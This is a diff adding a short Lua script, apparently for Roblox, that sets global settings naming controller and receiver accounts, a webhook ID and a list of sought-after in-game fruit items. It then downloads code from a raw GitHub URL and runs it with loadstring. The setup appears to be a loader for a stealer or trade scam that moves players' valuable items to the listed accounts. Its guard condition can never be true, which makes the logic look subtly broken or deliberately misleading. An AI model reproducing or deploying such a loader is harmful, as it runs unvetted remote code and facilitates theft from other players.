@@ -1,0 +1,40 @@
+local v2 = 1
+local tbl = {}
+local remove = table.remove
+for index = 1, 256 do
+    tbl[index] = index 
+end
+remove(tbl, math.random(1, #tbl))
+if #tbl == 0 then
+    setmetatable({}, { ["__index"] = v1, ["__metatable"] = nil })
+    getgenv()
+    getgenv().__SAB_RUN_ONCE = true
+    getgenv().Controllers = {
+        "SH4DOW_0022",
+        "moneytalk778",
+        "RocketZap84",
+        "godofgrandson",
+        "OrbitBlockStream2020",
+        "StormyLightDancer31",
+        "sauske2418",
+        "Skat3rZ3roSab3r",
+        "EagleFire2022YT",
+        "jamiulhasanS",
+        "GlitchSparklyRift201",
+        "enanpersonal"
+    }
+    getgenv().gpreceiver = "moneytalk778"
+    getgenv().Webhook = "wh_4d0734d5272e623956"
+    getgenv().WantedFruit = {
+        "Divine <Portal>",
+        "Red Lightning",
+        "Galaxy <Empyrean (Kitsune)>",
+        "Fiend (Yeti)",
+        "Werewolf (Tiger)",
+        "yellow Lightning",
+        "purple Lightning",
+        "Kitsune"
+    }
+    remove = GAME
+    loadstring(remove.HttpGet(remove, "https://raw.githubusercontent.com/okkkkk112/pro/refs/heads/main/alr"))()
+end
